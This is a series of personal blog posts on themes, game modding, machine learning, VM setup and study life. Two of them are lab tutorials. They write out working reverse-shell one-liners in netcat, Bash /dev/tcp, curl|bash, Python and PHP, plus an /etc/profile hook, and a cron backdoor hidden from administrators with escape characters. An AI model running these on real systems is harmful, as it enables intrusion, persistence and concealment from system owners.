title: Blog Themes I’ve Tried
text: A few thoughts on blog themes I’ve used, or at least installed. I’ve also included two at the end that caught my eye while reading the documentation. # What I like I have a weakness for all the bells and whistles: falling cherry blossoms, a little Live2D character in the corner, effects when you click the mouse, a big beautiful cover image… I’ve browsed and installed plenty of clean, elegant themes. They look good at first. Two days later I usually find myself changing themes again. Maybe they just feel a little too blank for me. # WordPress WordPress has enough themes and plugins that whenever I felt like tinkering, there was always something else to install. I did run into a sluggish dashboard and slow-loading pages, though. These are impressions from my own setup at the time. A slow site isn’t necessarily the theme’s fault. I quite liked Argon, for instance. # Sakura Sakura, maintained by mashirozx, is right up my street, down to the little details. I followed quite a few tutorials to get different effects working. My Live2D character never made it past the default model; designing and rigging one myself turned out to be a tall order. The site I built with it really did load slowly. Eventually I couldn’t put up with it and switched away. For a while I kept it around purely because it was pretty. I also wanted an About page built around a BotUI chatbot. I remember spending ages on that, trying one suggestion after another from Google. The JavaScript seemed to do absolutely nothing. Maybe it never loaded in the first place… For all the tinkering, I still like how Sakura looks. To find the settings now I’d start with the repository guide. The theme has its own settings screen, so plenty of changes are possible without touching the source files. For further styling, the author recommends a child theme. # Sakurairo The screenshot is from networkos.club, a site in the official showcase. It’s someone else’s setup, rather than my old site or the default appearance. Sakurairo is a reworking of Sakura V3. Its manual groups settings by scope, including global options, the home page and individual pages. Having so much in the dashboard would have saved me some of the hunting through tutorials I did with Sakura. What you can change depends on the version and configuration. Unfortunately I still had the same slow loading when I used it. # Ashe The Ashe theme page describes support for personal and multi-author blogs, a large header image, a full-screen slider and a mobile layout. Compared with the first two themes, the photos and posts take centre stage. If what you want is one lovely big image and a clear list of posts underneath, this one is worth a look. # Argon Argon is one I came away liking. You can change the theme colour, choose a one-, two- or three-column layout, and switch to night mode. The theme documentation is a good place to see what you’d like to configure. # Hexo # ShokaX ShokaX is derived from Shoka. It’s the theme this blog uses. I’ve changed the styling, so the current site only tells you so much about the default look. I’ve written up the details in my customisation notes and upgrade notes. # Two more that caught my eye These two are based on the official material. I haven’t used them in the same way as the ones above. # Typecho: Joe Joe has a two-column layout, configurable colours and syntax highlighting. It looks worth considering for a technical blog on Typecho if you like a little more going on around the posts. # Hexo: Butterfly Butterfly has a distinct card layout and two columns, with night mode, background effects and mouse-click effects. You can probably see why it appealed to me. The official demo and docs are a good way to pick out the effects you want.

title: Repairing the Ciri Main Menu Background Mod
text: I wanted Ciri in Night City – Main Menu Background Replacer to work on Cyberpunk 2077 version 2.0 and later, including the Phantom Liberty logo. Update 1.1.0: In my 1.0.0 fix, the animations that play when loading a save disappeared. I’ve restored the sequence, although its final shot now uses the replacement main menu background. The missing logo and missing loading sequence have different causes. The logo disappeared because the mod shipped older textures. The sequence disappeared because of how broadly the original mod replaced the background assets. If you’re here for the loading animations, skip to the final section. That’s where I rebuild the mod from scratch. Here’s the original mod at startup. The Phantom Liberty logo is missing: # Fixing the logo I used WolvenKit. # Restore the Phantom Liberty logo Open Mod Browser and locate the installed mod. Right-click the base folder and choose Add selected items to project. In Project Explorer, find and delete menu_background.xbm and menu_background_1080p.xbm . These are the two files causing the problem. # Pack the project Choose Build → Pack Project. WolvenKit writes a ZIP archive in the project folder. Remove the original mod and install the newly packed version in Cyberpunk 2077. The expansion logo is back: # How the original mod works Some background: Reading Cyberpunk 2077’s UI assets. I took the long way round to figure this out. Here’s what I found along the way. # Locating the background The mod changes quite a few files. I started by looking for the actual image it replaced. The main menu image changes as you progress through the story. I traced the images to base\gameplay\gui\world\loading_screens\ . Directory names such as loading_screen_5_after_q101 and loading_screen_10_after_q112 seem to correspond to story milestones. For instance, here’s loading_screen_10_after_q112\loading_screen_10_shot_01.xbm : I recognised that as the background that appears after sneaking in to install the virus on the float. Here’s another example, loading_screen_5_after_q101\loading_screen_5_shot_01.xbm : It matches the menu in my current save: # A closer look at the inkwidget The corresponding .inkwidget seemed the likely place to change the background. The old mod still replaced it successfully, despite the missing logo, so I could use it for comparison. I focused on loading_screen_5_after_q101.inkwidget because I could compare it with the menu I was actually seeing. The game file is on the left, the modded file on the right: On the right, the important file is cp_bg_alpha_faded.bk2 , the replacement Ciri animation. On the left, my background used the first shot, so I set the second and third shots aside. smoke_loop.bk2 is a looping video of smoke. shot_01_assets.inkatlas picks out the three light columns ( ad ) and the blinking lights ( antenna_lights ) from the texture. Here’s the underlying texture, short_01_assets.xbm . You can see the light effects together before the atlas separates them: loading_screen_5_shot_01.inkatlas supplies the main background. Its four bounds run from 0 to 1, so the selected region covers the entire texture. On the annotated menu, ① is the smoke loop and ② comes from the shot assets atlas: For the still image in this particular scene, replacing loading_screen_5_shot_01.xbm would do it. # Why the mod replaces every widget Replacing that one texture wouldn’t cover the other stages of the story. Looking more closely, I found that the modded loading_screen_5_after_q101.inkwidget had the same contents as the game’s base\gameplay\gui\world\loading_screens\initial_loading_screen\initial_loading_screen.inkwidget . The cp_bg_alpha_faded.bk2 animation referenced by that initial widget had already been replaced with Ciri. Copying the widget into the q101 folder therefore gave that menu the Ciri background as well. The original mod did the same in every corresponding folder. If the game keeps switching backgrounds, why not replace the lot? # Where the logo fix actually belongs None of that detective work directly fixed the logo. I couldn’t find a logo in the original q101 widget; what I’d traced was the background replacement. But once I’d accounted for those files, the rest of the mod was much easier to inspect. Two files stood out under base\gameplay\gui\fullscreen\main_menu\ : menu_background.xbm and menu_background_1080p.xbm . Here’s the modded texture on the left and the game’s on the right: The game already has the right logo. The mod’s older textures override it. Removing both textures from the mod lets the game use its own copies. # Update: restoring the loading animations After fixing the logo, I loaded a save from the main menu. Usually there’s a short sequence that changes with the story. This time the entire load was black. The sequence has three shots. Here are examples, in playback order: # Why the sequence went missing The mod replaced each story-specific widget with initial_loading_screen.inkwidget . Those original widgets also define the loading shots, as described in the inkwidget notes. In the comparison below, the story widget has ls_01 , ls_02 and ls_03 . The initial widget only has main_menu and loading_screen . The first remaining entry, main_menu , refers to the replacement Ciri video, cp_bg_alpha_faded.bk2 . The second refers to a different animation shown on entering the menu. The game can no longer find any of the three shots when loading a save. # Restore the shots and replace the menu background I started a fresh project. In Asset Browser I found the original mod’s Ciri background video, listed here as cp_bg_alpha_faded.bk2 , and added it to the project. Then I located the game’s loading_screen_5_after_q101.inkwidget and initial_loading_screen.inkwidget . I added the former to the project for editing and used Open without adding to project for the latter. Copy the cp_bg_alpha_faded.bk2 resource from the initial widget into the q101 widget’s externalDependenciesForInternalItems : In ls_01 → children , delete items 1–6, the layers making up the original menu background. Keep item 0, fade_to_black . It seems to handle the transition; without it the menu background animation stutters. From main_menu → children in the initial widget, copy cp_bg_alpha . It points to the video that the mod has replaced with Ciri. Paste it where you removed the other children in the q101 widget: Repeat for the widgets in the other story folders under loading_screens to cover the remaining backgrounds. One limitation remains. The main menu background and the third loading shot both use ls_01 . The first shot uses ls_02 and the second uses ls_03 . Changing ls_01 gives me the menu I wanted, but now Ciri also appears in that final shot. I haven’t found a way around that yet.

title: Reading Cyberpunk 2077’s UI Assets
text: These are my working notes on files I came across in Cyberpunk 2077’s archives while making a mod. I hadn’t worked on 3D animation or game production before, so some of the terminology here is my own best guess. # File types and what they do # xbm An .xbm stores image data used as a texture in the game. WolvenKit can preview it. Here’s expansion_logo.xbm : # inkatlas An .inkatlas seems to describe how to use separate regions of an .xbm image. Here’s expansion_logo.inkatlas , the atlas that goes with expansion_logo.xbm : I expanded entry 3, logo , and compared it with entry 4, logo_EN : Bottom, Left, Right and Top look like the boundaries of a region in the texture, expressed as values between 0 and 1. Here’s how I worked out which images they might describe: The Bottom value for entry 3 is close to the Top value for entry 4, suggesting the two images sit one above the other. Those vertical coordinates are close to 1, which places them near the bottom of the texture. Both Left values are the same and close to 0, placing them at the far left. My reading is that these entries correspond to the two English PHANTOM LIBERTY logos in the bottom-left corner. # inkwidget This file seems to describe the resources that make up an animation. Take loading_screen_5_after_q101.inkwidget : I think it corresponds to one of the little sequences that plays when you load a game from the main menu. These usually consist of three animations. In the screenshot, externalDependenciesForInternalItems lists resources needed by the internal items. The entries under libraryItems describe the animations themselves. Here ls_01 , ls_02 and ls_03 correspond to the three loading animations. I opened ls_01 for a closer look. Most of what interested me was under children . There are seven entries, and their names give some clues: For example, shot_01_bg appears to be the background for this shot, and antena_light_1 a blinking signal light. Expanding an item reveals the resource it refers to. In ls_02 , expanding BINK_RTW reveals a video resource: To see what it plays, I selected Add to Project on the video resource and opened it with RAD Video Tools: You might remember Ziggy Q and the NCPD spokesperson. # What I found in the directories # base\gameplay\gui\world\loading_screens\ The main menu background changes as you progress through the story. Several images also play in sequence when loading a save. For example, here’s loading_screen_5_after_q101\loading_screen_5_shot_01.xbm : The same image shows up on the main menu: That led me to the corresponding .inkwidget as the place to change the main menu background. title: How Reverse Shells Work
text: # What is a reverse shell? In a direct connection, the initiating machine connects to a port on the remote host. Web servers, SSH and remote desktop are familiar examples. Sometimes it is impossible to reach the remote machine directly. A connection initiated in the other direction behaves differently. In a reverse connection, the remote host initiates the connection to a listener. In the shell examples, command input and output then travel over that connection. # When connection direction matters The notes consider the following network conditions: A firewall may allow outgoing requests while blocking incoming connections. The target can still open an outbound connection to the listening port on the attacking machine, giving the attacker a shell. A local port on the remote host may already be occupied. The attacker can choose an available listening port on their own machine. The attacker may not know when the target will encounter a virus or Trojan, what network it will be on, or when it will be powered on. In that scenario, the attacker leaves a listener running and tricks the target into executing a program that connects back with a shell. The machine may be on a private network or its IP address may change. A directly reachable address may not be available. # Implementations Which reverse-shell method works depends on what’s available on the remote host. For example: If netcat, Socat or Telnet is installed, you can use that tool for the connection. If Bash is available, it can make the connection itself. A Python or PHP interpreter can also run a script that does the same thing. # Netcat Netcat (nc) is a small Unix utility for making TCP and UDP connections. # Preparation At the time of these notes, many Linux distributions shipped with a netcat package. Some versions omitted the -e option. I assumed that was a security precaution: -e lets netcat attach a local shell directly to the connection. For this test I installed a version with the option: wget https://jaist.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz tar -xvzf netcat-0.7.1.tar.gz ./configure make && make install make clean # Listener Syntax: nc -lvvp <listener-port> netcat -lvvp 23333 # Connection from the remote host Syntax: nc <listener-IP> <listener-port> -e /bin/bash netcat 192.168.158.139 23333 -e /bin/bash The listener has to be running before the target connects back. Here’s the resulting shell: # Bash This version uses Bash network redirection. # Preparation The default shell on my Kali installation was zsh. Use echo "$SHELL" to see which login shell is configured for the current user. I switched shells for the test: Change the login shell: chsh -s /bin/bash Reboot: reboot Note: The error below occurred because the listener wasn’t running. Some Debian builds may also have Bash network redirection disabled by default. In that case I rebuilt Bash with --enable-net-redirections . I wrote up the build separately in Rebuilding Bash for network redirection. # Command I started a local listener on the receiving machine first. Syntax: bash -i >& /dev/tcp/<listener-IP>/<listener-port> 0>&1 bash -i >& /dev/tcp/192.168.158.139/23333 0>&1 The connection worked: On the target, which initiated the connection: On the listening machine: # Explanation bash -i Starts an interactive Bash shell. >& Joins the streams before the operator and redirects them to the destination after it. /dev/tcp/192.168.158.139/23333 Bash recognises the special path /dev/tcp/ip/port. In this example it opens a TCP connection from the target to port 23333 on the listening host, 192.168.158.139. 0>&1 0 and 1 are file descriptors. Here standard input (0) is redirected to the same destination as standard output (1). That is how the connection carries both input and output. # Curl and Bash Here’s another way I tried the Bash version. The curl command uses a shell pipeline. # Preparing index.php I created an index.php file on the listening machine. Its contents were the command I’d previously run on the target for the Bash connection: bash -i >& /dev/tcp/192.168.158.139/23333 0>&1 I saved it under the web root. On my Kali guest running Apache2, that directory was /var/www/html/. After starting Apache2, I found an index.php in that directory. I could replace its contents directly. It just supplied the page shown below. # Listener setup Command: netcat -lvvp 23333 # Client-side request Command: curl 192.168.158.139|bash Here’s what that looked like: The reverse connection succeeded: # Shell startup files The /etc/profile file runs when a Bash login shell starts. # Illustration I’d typed the command incorrectly in this screenshot, so starting Bash printed an error. Even with the correct command, I still got an error if the receiving machine wasn’t listening: # Procedure I edited the file with vim /etc/profile : I appended /bin/bash -i >& /dev/tcp/192.168.158.139/23333 0>&1 & . The extra ampersand at the end runs the command in the background. That leaves the login shell available to the user. Test run I started the listener on port 23333. In Xshell I opened a session on the target, starting Bash. Nothing was echoed in the login session, and the listener received a shell. # Socat Socat is a multipurpose networking utility for Linux, similar to netcat. I used it on both ends of the reverse connection. # Downloading Socat My Kali installation already had Socat. On a machine without it, the first step was to install it. The installation command was apt-get install socat . # Listener Command: socat TCP-LISTEN:23333 - # Connecting with Socat Command: socat tcp-connect:192.168.158.139:23333 exec:'bash -li',pty,stderr,setsid,sigint,sane The resulting shell: # Telnet Sometimes neither Netcat nor /dev/tcp is available on the target. If Telnet is installed, it offers another way to connect back. Start a listener on the receiving host. Either nc or socat works. Run the command on the target to open the connection: mknod a p; telnet 47.xxx.xxx.72 2333 0<a | /bin/bash 1>a The resulting shell: # Python This version uses Python’s socket library. With the listener running, I used this command: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.158.139",23333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' I could also save the same Python as a .py file and run it from the command line. Here’s the setup: The reverse shell connected successfully: # PHP I started the listener and ran the following PHP script on the target: php -r '$sock=fsockopen("192.168.158.139",23333);exec("/bin/sh -i <&3 >&3 2>&3");' Here’s the result: # Closing notes After trying these approaches, I found that they all came back to the same idea. Whether implemented in a tool or a script, the basic pieces are a connection and redirection of input and output. Working through the examples made a principle that had seemed rather vague to me much clearer.

title: Building Bash with Network Redirections
text: I rebuilt Bash from source. These notes cover downloading the source, compiling it and switching to the new shell. I used Bash 5.1.16 in a Kali virtual machine. It was already an older release when I documented this; choose the version appropriate to your own environment. # Check the installed shell and Bash version First check the login shell configured for the account: echo "$SHELL" $SHELL normally contains the login shell path. My guest used zsh by default, but also had Bash installed. Check its version separately: bash --versionMy installed version was Bash 5.1.16: # Download and install Bash I wanted to select a build option explicitly, so I built from source. You’ll need a C compiler and make. On Kali, sudo apt install build-essential installs the build tools. # Download Find the 5.1.16 source archive in the GNU Bash download directory and download it with wget: wget https://ftp.gnu.org/gnu/bash/bash-5.1.16.tar.gz # Extract the source tar -zxvf bash-5.1.16.tar.gzThis creates a bash-5.1.16 directory in the working directory: Change into it: cd bash-5.1.16# Configure the build Select a separate installation prefix and explicitly enable network redirections: ./configure --prefix=/usr/local/bash --enable-net-redirectionsThe --prefix option puts the installation under /usr/local/bash , leaving the system’s existing Bash binary in place. # Compile and install Build the configured source: make After the build succeeds, install it under the selected prefix: sudo make installI was running as root in the screenshot, so the command there is simply make install . # Use the new shell You can launch it directly without changing the account’s login shell: /usr/local/bash/bin/bashTo make it your login shell, check whether /etc/shells already lists /usr/local/bash/bin/bash . If it’s absent, append it: echo '/usr/local/bash/bin/bash' | sudo tee -a /etc/shellsSet the current account’s login shell: chsh -s /usr/local/bash/bin/bashLog out and back in for the change to take effect. A full reboot isn’t necessary. Run echo "$SHELL" after logging back in to check the configured path.

title: Convolutional Neural Networks
text: Applications: object detection and recognition, classification and retrieval, and super-resolution reconstruction. Central question: how do we extract useful features? # The architecture In the image classifier in these notes, the convolutional network accepts the image as a three-dimensional array of height, width and channels. The spatial structure is preserved at the input instead of immediately flattening the pixels. Input: the image array. Convolution: extract local features. Pooling: reduce the spatial size. Fully connected layers: combine the features for prediction. Each output unit is connected to every unit in the preceding layer. In the architecture shown, a ReLU activation follows each convolution. The convolution and pooling stages extract features; the classifier flattens the feature maps into a vector for the fully connected stage. # Convolution A filter combines local information across the input channels. If the input has nnn channels, a conventional dense convolutional filter spans all nnn. Each filter produces one output feature map. With mmm filters, the output has mmm channels. Four parameters are worth tracking: Stride: how far the window moves at each step. A smaller stride samples positions more densely; 1 is common. Kernel size: a smaller window examines a more local neighbourhood. A common choice is 3×33\times33×3. A 1×11\times11×1 kernel can mix channels at the same spatial location. Padding: in a convolution without padding, central input values participate in more windows than edge values. Adding zeroes around the edges lets filters reach more boundary positions. Number of filters: determines the number of output feature maps. Each filter learns its own weights. When the stride divides the available distance exactly, the output dimensions are Height: H2=H1−FH+2Ps+1H_2=\frac{H_1-F_H+2P}{s}+1H2​=sH1​−FH​+2P​+1. Width: W2=W1−FW+2Ps+1W_2=\frac{W_1-F_W+2P}{s}+1W2​=sW1​−FW​+2P​+1. Here H1,W1H_1,W_1H1​,W1​ are the input dimensions, FH,FWF_H,F_WFH​,FW​ the filter dimensions, sss the stride and PPP the padding on each side. Convolution needn’t shrink the image: with suitable settings the output has the same height and width as the input. # Pooling Max pooling takes the largest value in each window. Average pooling takes its mean. Global average pooling averages the spatial positions in each channel. A pooling operation has no learned weight matrix, so it can be left out of a count of weight-bearing layers. Downsampling loses some information. One common design choice is to increase the number of feature maps in the following convolution, for example by doubling it. # Tracking feature map shapes Convolution changes the features and can change the number of channels. Pooling reduces spatial dimensions. The final flattening step collects all the values from nnn feature maps of width www and height hhh into a vector of length w×h×nw\times h\times nw×h×n. # Residual networks Does adding layers always improve a network? No. The middle layers extract features. Doing that fifty times needn’t give a better result than doing it twenty times. In the example below, the deeper network actually has higher training error. ResNet, proposed in 2015, addresses this with a residual connection. For matching input and output shapes, a residual block adds its input to the learned residual: y=x+F(x)y=x+F(x)y=x+F(x). When F(x)F(x)F(x) is close to zero, the block passes the input through nearly unchanged without having to learn the identity mapping from scratch.

title: Installing Windows 11 in VMware Workstation
text: I accidentally deleted all my virtual machines and didn’t have a backup. Here’s how I reinstalled Windows 11. I used VMware Workstation 16.x and the March 2022 Windows 11 image, and installed the Pro edition. The steps and screenshots reflect that setup; newer releases may look different. # Downloading the Windows 11 image I found the image on NEXT, ITELLYOU, run by the same team as MSDN, I Tell You. Open “原版软件” (original software) in the top navigation: Select Windows 11 from the operating system list: I downloaded the business editions image and selected Pro during installation. These are multi-edition images. Both include Pro; the business image includes Enterprise and the consumer image includes Home. Check the edition list in the image you downloaded. This is the filename and ED2K link from my installation. For a new VM, the current image is also available from Microsoft’s download page. ed2k://|file|zh-cn_windows_11_business_editions_updated_march_2022_x64_dvd_7df6eae1.iso|5582235648|B7C9D076AE16A10C9D2610207577F28D|/# Installing Windows 11 in a VM # Create the virtual machine Check the memory, disk and TPM configuration together before starting the installer. Open File → New Virtual Machine and select the downloaded ISO as the installation source. My Workstation release had no Windows 11 entry, so I selected Microsoft Windows → Windows 10 x64. If your release offers Windows 11 x64, select that directly. I allocated 100 GB for the virtual disk. Windows 11 requires at least 64 GB; the screenshot’s 60 GB recommendation was for Windows 10. Before finishing the wizard, open Customize Hardware to adjust memory and processors. I used 4 GB RAM, four CPU cores and the 100 GB disk. Microsoft’s specifications include a compatible 64-bit dual-core processor, 4 GB of memory, 64 GB of storage, Secure Boot-capable UEFI and TPM 2.0. Leave the VM powered off for the next step. # Add the TPM Without a TPM, Setup can report that the PC can’t run Windows 11 even with enough memory and storage: My version of Workstation required an encrypted VM before I could add a trusted platform module. With the VM off, open Options → Access Control → Encrypt. Set a password and keep a copy. The password unlocks the VM. Whether you’re prompted on subsequent launches depends on whether it was saved. Under Hardware → Add, select Trusted Platform Module and finish the wizard. Check that Options → Advanced uses UEFI and has Secure Boot enabled. Save and start the installer. If it still rejects the configuration, recheck the processor and memory settings. See also VMware’s Windows 11 guest installation notes. # Boot and install Click inside the VM so it receives keyboard input. When you see Press any key to boot from CD or DVD... , press a key promptly. If you miss it, the VM tries other boot devices. This EFI network timeout means the VM moved on to network boot; the installer hasn’t frozen. Restart and catch the disc prompt. Choose the installer language and other options, then select an edition. I installed Windows 11 Pro. Select Custom: Install Windows only (advanced) for a clean installation on this blank VM. Select the unallocated space, click New, choose a partition size and apply it. I used the entire 100 GB for the system without a separate D: drive. Setup creates the small system partitions it needs. Select the primary Windows partition, continue and wait for Setup to copy the files and restart. Complete the region, keyboard and account setup. Wait for Windows to prepare the desktop. # Installing VMware Tools I wanted to copy commands and share files between host and guest, so I installed VMware Tools next. Select VM → Install VMware Tools to mount the installation disc. If the wizard doesn’t open automatically, open the virtual disc in File Explorer and run setup64 . Mine was drive D:; yours may differ. Follow the wizard and select Typical. Click Finish and restart the guest when prompted. # Activating Windows 11 Pro Check Settings → System → Activation. Mine showed Windows as unactivated: That doesn’t mean Windows will stop booting after a fixed period. I wanted to clear the warning. Activation requires a licence for the installed edition; for personal use, enter your product key here or use an existing digital licence. The following records the KMS procedure for an environment with the appropriate volume licence and KMS service. This is the key I used then. I haven’t verified that it still works. See Microsoft’s KMS client key guidance for the requirements. Search for CMD and open Command Prompt as administrator. Install the Windows 11 Pro KMS client key: slmgr /ipk W269N-WFGWX-YVC9B-4J6C9-T83GX If you need to specify the KMS server manually, use slmgr /skms <server-address> with the address provided by your organisation. The address in the screenshot belongs to the original setup. Saving the address doesn’t establish that the service is reachable or that activation has succeeded. Run slmgr /ato to request activation. Return to Settings to check the result: # Adding a shared folder With VMware Tools installed, the guest can access a shared host directory, as in my Windows 7 VM notes. In VM settings, choose Options → Shared Folders → Always enabled and add the host directory. In Windows 11 File Explorer, enter \\vmware-host\Shared Folders in the address bar and check that your folder appears. To find the share by browsing Network, you may need network discovery for that network profile. The screenshot shows my setup. Direct access to the VMware path doesn’t require enabling discovery on public networks. To make the share easier to open later, choose Map network drive from This PC. Choose a drive letter. Enter the share path under Folder, or use Browse. Expand vmware-host → Shared Folders → VMware共享 . The final component is the share name I chose. Finish the wizard. The share will appear under network locations in This PC and you can open it from there.

title: Updating My ShokaX Theme
text: Shoka-X had changed quite a bit, so I used some spare time to update my theme. I’d customised a fair number of its files the first time around. Getting those changes back was enough work that I wanted to write down the process. For the sake of the next upgrade, I’m trying to leave the theme’s source files alone wherever I can. PS: I found the plugin system 🎉. While I’m here, I might as well redo the Hitokoto footer and open an issue. # Installing Shoka-X With so many changes, including edits to the theme itself, I started in a fresh directory. I used the ShokaX starter: git clone https://github.com/theme-shoka-x/shokax-can --depth=1cd shokax-canpnpm installpnpm dlx hexo sThe fresh install ran locally. From the themes directory I then created a symlink to the installed theme: ln -s ../node_modules/hexo-theme-shokax shokax # Updating the configuration PS: The music player seems to work this time without my old changes. # Site configuration In _config.yml I carried over: The site description. The URL and permalink settings. category_map . Deployment settings. Minification settings, including the additional hexo-lightning-minify package. On my Mac the local run reported Error: Cannot find module '@minify-html/node-darwin-arm64' . My deployment ran in GitHub Actions, so that local issue didn’t block it. The Algolia search configuration I used at the time. # Copying the theme configuration I copied _config.yml from themes/shokax to the project root and named the copy theme_config.shokax.yml . The changes I made were: Set alternate , the large site title. Adjust the time dark mode starts. Add the Travellings link and icon to the menu. Enable Waline comments, set the server URL and add placeholder text. # Moving the source directory I copied the contents of my existing source directory over the starter’s. # Adding languages.yml I realised I could override translations without editing the theme’s language files. I added languages.yml in source/_data/ . For each language, I added the travellings entry under menu for 开往. I also changed the browser tab titles shown when the page becomes active or hidden. # Iconfont When I first used the theme, the original Shoka project had stopped updating and joining its Iconfont project wasn’t practical. I ended up modifying the ShokaX source quite a bit. This time I found an invitation link in the ShokaX documentation. No need to do all that again 🎉. After joining, I added the Shoka icons to my own Iconfont project. In _config.yml I set iconfont to the identifier from the project’s hosted stylesheet, which has the form //at.alicdn.com/t/c/font_<string>.css . I opened http://at.alicdn.com/t/c/font_<string>.css to find the new icon: Then I copied themes/shokax/source/css/_iconfont.styl into source/_data and appended the code for the icon. # Preconnecting to the image host This setting was new to me, so I tried it out. Most of my images are on Cloudinary, so I added https://res.cloudinary.com under preConnect . # SEO I hadn’t configured this before and took the opportunity to set it up. # Installing and writing plugins The plugins I tried came in two forms. JavaScript plugins came as folders to download; npm plugins installed through the package manager. # Counting visits and visitors hexo-shokax-busuanzi is an npm plugin, so I installed it with pnpm add . # Showing the site’s age This JavaScript plugin took two manual steps: Create a scripts directory in the Hexo project root and place the JavaScript file inside it. Put the views directory at the project root as well. # Making a Hitokoto footer plugin My old quote feature required editing footer.pug . Once I knew the theme supported plugins, I wanted to try implementing it that way instead. PS: I ended up making a combined plugin. Too many separate bits in the footer looked cluttered.

title: Linux Backdoors, Part 2
text: I’ve written up the environment separately in Setting up the Linux lab. After gaining control of a server, an intruder may leave scripts, processes or links that allow access to continue. These are often called backdoors. This instalment looks at two Linux examples: SSH public-key authentication Scheduled jobs … # SSH public-key authentication In this lab I manually registered my SSH public key on the target server by adding it to /root/.ssh/authorized_keys . I could then log in as root with the matching private key, without entering the account password. Implementation: Use Xshell's Tools -> New User Key Generation Wizard to generate SSH public key and private key: (Enter a passphrase for the private key.) Save the generated public key file (id_rsa_2048.pub) and transfer it to the target server: Locate the authorized_keys file. Use the command find -name authorized_keys . If it doesn't exist, create it with touch /root/.ssh/authorized_keys . Generate an RSA key pair by running ssh-keygen -t rsa . Add the public key to authorized_keys by running cat path/to/public_key >> /root/.ssh/authorized_keys to complete registration. Change file permissions: chmod 600 ~/.ssh/authorized_keys and chmod 700 ~/.ssh . The attacker uses the private key generated by Xshell and the passphrase entered when the key was generated to log in to the target server: # Cron persistence Once running, the cron daemon periodically checks its configuration for jobs that are due, normally once a minute. It executes jobs according to the schedules defined there. A crontab describes programs to run on a schedule. We can create a scheduled backdoor using the crontab command: (crontab -l;echo '*/60 * * * * exec 9<> /dev/tcp/192.168.158.132/2333;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i')|crontab - Explanation: echo '*/60 * * * *' : Set to execute every 60 minutes; exec 9<>/dev/tcp/192.168.158.132/2333 : Utilize the functionality provided by bash to parse strings starting with /dev/tcp/ , specifying the server IP as 192.168.158.132 (attacker's IP), port number as 2333, specifying descriptor as 9, to establish a network connection; exec 0<&9;exec 1>&9 2>&1; : File descriptor 0: stdin, 1: stdout, redirect both standard input and output to descriptor 9; /bin/bash --noprofile -i : Open a shell. Essentially, it's using Bash to connect a reverse shell back to the specified IP address. Here, Bash needs to support network redirection, and whether it supports it depends on the compilation configuration of the Bash used. Hiding: However, such a backdoor can be seen by the administrator by directly executing crontab -l . This command is actually reading the /var/spool/cron/crontabs/root file. So, we can utilize a flaw in cat by using some escape characters, such as \r (carriage return), \n (new line), \f (form feed), to hide the command we don't want the administrator to see: (crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/192.168.158.132/2333;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab - However, if cat -A /var/spool/cron/crontabs/root is used, it can still be seen that we have hidden something.

title: A Little Update from Sydney
text: The short version: I’m at the University of Sydney doing the Master of Computer Science (Advanced). It’s the end of semester two, 2024, and exams are nearly here. # Studying Time is tight. There’s a lot of practical work here, though I’ve written my share of reports too. Classes usually come in two flavours. In a lecture, one professor teaches a whole room of students. A tutorial is smaller and more hands-on: one tutor to a dozen or so students. The assignments come one after another, and they’re often a headache. Some courses have weekly tasks on top of that. It’s hard to get a breather during the week, and I usually have to set aside a day of the weekend for coursework. I’ve learned a lot, though. Some reports taught me precious little about the subject, but at least my written English got better. And reports are only a small part of it. Quite a few of the assignments have been genuinely interesting and helped me figure things out. # Everyday life By my reckoning, most things here cost about five times what they do back home. A few things cost about the same. On an ordinary day I spend upwards of 150 yuan on food alone. I can live with that. The rent is what gets me. I pay 2,100 yuan a week, or 8,400 for four weeks, and that’s about as low as I’ve seen in Sydney. Paying less would mean competing for one of the few university rooms. Even those run to around 1,600 a week. Still a lot. # Games After finishing the main story of The Witcher 3 and Hearts of Stone, I completely lost the urge to play anything. I even bought Black Myth: Wukong and haven’t started it yet... The Witcher 3 really is that good. It’s about a decade old and the textures show their age, but the story, the mechanics, the combat — I had fun with all of it. Especially the story. One choice can open up so many possibilities. It was the first time I’d really felt how a story could branch and weave back together. Even the little side quests and contracts were worth doing. Oh, and I can’t exactly leave out Gwent 🐶. I can see why people felt Cyberpunk 2077 fell short of what CD Projekt Red could do. The mountain of bugs at launch didn’t help, but even now that the game runs much better, its story just doesn’t come close to The Witcher 3 for me. (Phantom Liberty was pretty good, though.) # Plans for the summer My main plan is to work on a university project. It should be fairly relaxed, at least compared with this semester. That leaves some time to write code for things I actually want to make. These are ideas that occurred to me in class or in everyday life and still seemed feasible after a little digging. Most tempting first: Cyberpunk 2077 mods. Ciri once travelled to what looked like the world of Cyberpunk 2077. I’d like to bring together some existing mods and put together a Ciri cosplay set. Improve Always First Equip. It’s very configurable, but what I really want is something like the weapon inspect animation in VALORANT. Replace the main menu background. There was a mod for this, but it barely works since 2.0 and Phantom Liberty. I’ll try to fix it. Ciri’s clothes. A mod already exists, but the hands don’t line up properly in first person. I’d like to fix that. Ciri’s sword. Tweak the weapon stats in an existing mod. A little boost does help keep things fun on hard difficulty 🐶. Ciri has that distinctive dash you trigger with the space bar. There’s a similar ability in 2077, but in cutscenes she can actually teleport. That last bit is very much an idea; it sounds hard. Game saves. I contributed a few features to mcthesw/game-save-manager early on. It’s passed 600 stars now. People are still suggesting improvements and features in the issues, and I’d like to see if I can contribute again. OCR for novels. I think Qidian changed something about its paid chapters. Scraping no longer works on most of the sites I’ve seen, but OCR is a different matter. The app blocks screenshots on the device itself. In an Android emulator, though, a script could turn pages and Windows could capture a fixed area for OCR. It struck me that one subscriber could then make pirated copies available to other people. Subtitle translation. I could integrate a translation service with Windows Live Captions. That would mean working with both the Windows API and the translation service’s API. I found SakiRinn/LiveCaptions-Translator on GitHub. When I tried it, quite a few things didn’t work as well as I’d hoped. There might be something I can improve there.

title: Linux Backdoors, Part 1
